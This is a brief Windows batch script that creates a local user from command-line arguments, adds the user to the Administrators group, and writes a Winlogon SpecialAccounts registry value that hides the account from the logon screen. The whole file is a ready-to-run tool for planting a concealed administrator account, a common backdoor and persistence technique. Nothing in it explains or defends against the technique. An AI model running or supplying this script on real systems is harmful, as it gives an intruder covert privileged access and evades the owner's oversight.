@echo off
set user=%1
set pass=%2
net user /add %user% %pass%
net localgroup administrators /add %user%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0